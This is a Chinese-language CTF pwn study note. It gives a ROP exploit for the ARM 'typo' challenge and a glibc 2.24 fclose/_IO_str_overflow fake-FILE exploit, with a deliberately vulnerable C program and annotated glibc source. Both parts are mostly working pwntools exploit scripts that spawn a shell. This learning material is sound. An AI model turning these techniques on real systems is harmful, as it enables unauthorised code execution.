## Pwn

### jarvisoj - typo

```
// file
typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped

// checksec
[*] '/tmp/tmp/typo'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8000)
```

輸入只有一個，並且在輸入大量字元後會有 segmentation fault，又因為是 statically linked，所以使用 ROP 做 exploit，目標是 `system("/bin/sh")`。

Arm 的 calling convention 如下:

| Registers | Use       | Comment                                           |
| --------- | --------- | ------------------------------------------------- |
| R0        | arg1      | function arguments / return value                 |
| R1        | arg2      | function arguments                                |
| R2        | arg3      | function arguments                                |
| R3        | arg4      | function arguments                                |
|           |           |                                                   |
| R4        | var1      | preserver value and callee saved                  |
| R5        | var2      | preserver value and callee saved                  |
| R6        | var3      | preserver value and callee saved                  |
| R7        | var4      | preserver value and callee saved                  |
| R8        | var5      | preserver value and callee saved                  |
|           |           |                                                   |
| R9        | var6      | variable or static base                           |
| R10       | var7 / sp | variable or stack limit                           |
| R11       | var8 / fp | variable or frame pointer                         |
| R12       | var9 / ip | variable or new static base for interlinked calls |
| R13       | sp        | staick pointer                                    |
| R14       | lr        | link back to calling routine                      |
| R15       | pc        | program counter                                   |

用 ROPgadget 找 ROP gadget `ROPgadget --binary ./typo --only "pop"` 以及 binsh 字串 `ROPgadget --binary ./typo --string "/bin/sh"`。

要控制第一個參數以及 pc，因此選擇 `0x00020904 : pop {r0, r4, pc}`。

offset 的部分，可以用 `cyclic` 求得:

```
pwndbg> cyclic 200
aaaabaaacaaadaaa...
pwndbg> c
pwndbg> cyclic -l 0x62616164
112
```



exploit:

```python
#!/usr/bin/python3
 
from pwn import *
import sys 
 
context.arch = 'arm'
 
pop_r0_r4_pc = 0x00020904 # pop {r0, r4, pc}
binsh = 0x0006c384 # /bin/sh
_system = 0x110B4
offset = 0x70 # 112 == input(0x70-0xC) + 0x8 + fp (old_ebp, 0x4)
 
payload = offset * b'\xff' + p32(pop_r0_r4_pc) + p32(binsh) + p32(0) + p32(_system)
 
if len(sys.argv) > 1:
    r = process(["qemu-arm", "-g", "4000", "./typo"])
    input("wait to attach")
else:
    r = process("./typo")                                                                                                                       
r.sendafter("Input ~ if you want to quit", "\n")
r.sendafter("------Begin------", payload)
 
r.interactive()
```



### fclose exploit

```c
#include <stdio.h>
#include <unistd.h>

char fake_file[0x200];

int main() {
  FILE *fp;
  puts("Leaking libc address of stdout:");
  printf("%p\n", stdout); // Emulating libc leak
  puts("Enter fake file structure");
  read(0, fake_file, 0x200);
  fp = (FILE *)&fake_file;
  fclose(fp);
  return 0;
}
```

```
// file
vuln: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6b83490784ec7368deac3560524ee83f2a5ab22d, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/home/u1f383/tmp/file_practice/vuln'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

使用 `gcc -g -o vuln vuln.c` 來編譯 binary，環境為 glibc 2.24。

`fclose()` exploit 主要是利用合法的 vtable `_IO_str_jumps` function `_IO_str_overflow`會使用到 FILE 中可控的部分來 call function pointer。

呼叫方法有兩種:

1. process 結束時呼叫的 `_IO_flush_all_lockp` 會去執行 `_IO_OVERFLOW (fp, EOF)`，執行流程為 `malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_overflow`
2. `fclose() -> _IO_FINISH() -> _IO_str_overflow()`

首先看一下 glibc 2.24 的 `_IO_str_overflow()`:

```c
// /libio/strops.c

int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
    
  if (fp->_flags & _IO_NO_WRITES) // <--- check
      return flush_only ? 0 : EOF;
    
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
    
    
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */ // <---- check
	return EOF;
      else
	{
	  char *new_buf;
	  char *old_buf = fp->_IO_buf_base;
	  size_t old_blen = _IO_blen (fp); // _IO_buf_end - _IO_buf_base
	  _IO_size_t new_size = 2 * old_blen + 100; // new_size == address of "/bin/sh"
	  if (new_size < old_blen)
	    return EOF;
	  new_buf
	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size); // _allocate_buffer -> system    
          
      /* exploit redundant */
	  if (new_buf == NULL)
	    {
	      /*	  __ferror(fp) = 1; */
	      return EOF;
	    }
	  if (old_buf)
	    {
	      memcpy (new_buf, old_buf, old_blen);
	      (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);
	      /* Make sure _IO_setb won't try to delete _IO_buf_base. */
	      fp->_IO_buf_base = NULL;
	    }
	  memset (new_buf + old_blen, '\0', new_size - old_blen);

	  _IO_setb (fp, new_buf, new_buf + new_size, 1);
	  fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
	  fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
	  fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
	  fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);

	  fp->_IO_write_base = new_buf;
	  fp->_IO_write_end = fp->_IO_buf_end;
	}
    }

  if (!flush_only)
    *fp->_IO_write_ptr++ = (unsigned char) c;
  if (fp->_IO_write_ptr > fp->_IO_read_end)
    fp->_IO_read_end = fp->_IO_write_ptr;
  return c;
}
libc_hidden_def (_IO_str_overflow)
```

- `& _IO_NO_WRITES != true`
- `fp->_IO_write_ptr - fp->_IO_write_base >= _IO_blen (fp) == buf_end - buf_base`
- `& _IO_CURRENTLY_PUTTING == 1`
- `& _IO_USER_BUF != 1`

```c
// /libio/libioP.h

#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
```

第二種作法的 exploit (`fclose() -> _IO_FINISH() -> _IO_str_overflow()`):

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

r = process('./V', env={"LD_PRELOAD": "./libc.so.6"})

r.recvuntil('Leaking libc address of stdout:\n')
libc = int(r.recvline()[:-1], 16) - 0x3c2600
info(f"libc: {hex(libc)}")

binsh = libc + 0x18ac40 # new_size
_system = libc + 0x456a0
_IO_str_overflow_ptr = libc + 0x3be4c0

assert((binsh-100) % 2 == 0)

buf_end = (binsh - 100) // 2
buf_base = 0
write_ptr = (binsh - 100) // 2
write_base = 0
fake_vtable = _IO_str_overflow_ptr + 0x8 # call offset + 0x10
_lock = libc + 0x3c2870 # buffer

_IO_IS_FILEBUF = 0x2000
_IO_LINKED = 0x80
_IO_CURRENTLY_PUTTING = 0x800

flag = 0xfbad8000
flag = flag

fake_file = p64(flag)
fake_file += p64(0)*3 # read ptr end base
fake_file += p64(write_base) + p64(write_ptr) + p64(0) # write base ptr end
fake_file += p64(buf_base) + p64(buf_end) # buf base end
fake_file = fake_file.ljust(0x70, b'\x00') # fill to before fileno
fake_file += p64(0)
fake_file = fake_file.ljust(0x88, b'\x00') # fill to before _lock
fake_file += p64(_lock)
fake_file = fake_file.ljust(0xd8, b'\x00') # fill to before vtable
fake_file += p64(fake_vtable) # 0xd8
fake_file += p64(_system) # _allocate_buffer offset 0xe0

input()
r.sendafter('Enter fake file structure', fake_file)
r.interactive()
```



而另一條是使用 `_IO_str_finish`，一樣有兩種做法:

1. `fclose() -> _IO_FINISH() -> _IO_str_finish`
2. `malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_finish`

以下為 `fclose()` source code:

```c
int
_IO_new_fclose (_IO_FILE *fp)
{
  int status;

  CHECK_FILE(fp, EOF);

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)
  /* We desperately try to help programs which are using streams in a
     strange way and mix old and new functions.  Detect old streams
     here.  */
  if (_IO_vtable_offset (fp) != 0)
    return _IO_old_fclose (fp);
#endif

  /* First unlink the stream.  */
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp);
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp);
  else
    status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
  _IO_release_lock (fp);
  _IO_FINISH (fp); // <-- 進入這
  if (fp->_mode > 0)
    {
#if _LIBC
      /* This stream has a wide orientation.  This means we have to free
	 the conversion functions.  */
      struct _IO_codecvt *cc = fp->_codecvt;

      __libc_lock_lock (__gconv_lock);
      __gconv_release_step (cc->__cd_in.__cd.__steps);
      __gconv_release_step (cc->__cd_out.__cd.__steps);
      __libc_lock_unlock (__gconv_lock);
#endif
    }
  else
    {
      if (_IO_have_backup (fp))
	_IO_free_backup_area (fp);
    }
  if (fp != _IO_stdin && fp != _IO_stdout && fp != _IO_stderr)
    {
      fp->_IO_file_flags = 0;
      free(fp);
    }

  return status;
}
```

- `& _IO_IS_FILEBUF == true`
- `& _IO_LINKED == false`: bypass `_IO_un_link()`
- 將 `f->_lock` 設成指向 null 的 pointer，避免 `_IO_acquire_lock (fp)`  出問題



` _IO_str_finish` source code:

```c
// /libio/fileops.c

void
_IO_str_finish (_IO_FILE *fp, int dummy)
{
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base); // <-- exploitable
  fp->_IO_buf_base = NULL;

  _IO_default_finish (fp, 0);
}
```



`_IO_file_jumps` / `_IO_str_jumps` 的 function pointer list:

```c
// /libio/fileops.c

const struct _IO_jump_t _IO_file_jumps libio_vtable =
{
  JUMP_INIT_DUMMY, // ~ 0x10
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_new_file_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, _IO_new_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close), // 0x88
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

// /libio/strops.c
const struct _IO_jump_t _IO_str_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_str_finish),
  JUMP_INIT(overflow, _IO_str_overflow),
  JUMP_INIT(underflow, _IO_str_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_str_pbackfail),
  JUMP_INIT(xsputn, _IO_default_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_str_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_default_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

```c
// /libio/strfile.h

typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;

// example
$12 = {
  _sbf = {
    _f = {
      _flags = -72540024,
      _IO_read_ptr = 0x0,
      _IO_read_end = 0x0,
      _IO_read_base = 0x0,
      _IO_write_base = 0x0,
      _IO_write_ptr = 0x0,
      _IO_write_end = 0x0,
      _IO_buf_base = 0x0,
      _IO_buf_end = 0x0,
      _IO_save_base = 0x0,
      _IO_backup_base = 0x0,
      _IO_save_end = 0x0,
      _markers = 0x0,
      _chain = 0x0,
      _fileno = 0,
      _flags2 = 0,
      _old_offset = -1,
      _cur_column = 0,
      _vtable_offset = 0 '\000',
      _shortbuf = "",
      _lock = 0x7f156e1c0770 <_IO_stdfile_0_lock>,
      _offset = -1,
      _codecvt = 0x0,
      _wide_data = 0x7f156e1be9a0 <_IO_wide_data_0>,
      _freeres_list = 0x0,
      _freeres_buf = 0x0,
      __pad5 = 0,
      _mode = 0,
      _unused2 = '\000' <repeats 19 times>
    },
    vtable = 0x7f156e1bb400 <_IO_file_jumps>
  },
  _s = {
    _allocate_buffer = 0x0, // offset 0xe0
    _free_buffer = 0x0
  }
} 
```

- `_allocate_buffer` offset 為 0xe0，接在 vtable 後



最後 `_IO_wstr_jumps->_IO_wstr_overflow` 也能使用，方法都大同小異

P.S. glibc 2.29 的版本可以使用 `(*fp->_codecvt->__codecvt_do_encoding)(fp->_codecvt)` (`_IO_wfile_sync`) 做 exploit，題目為 BalsnCTF 2020 Diary。
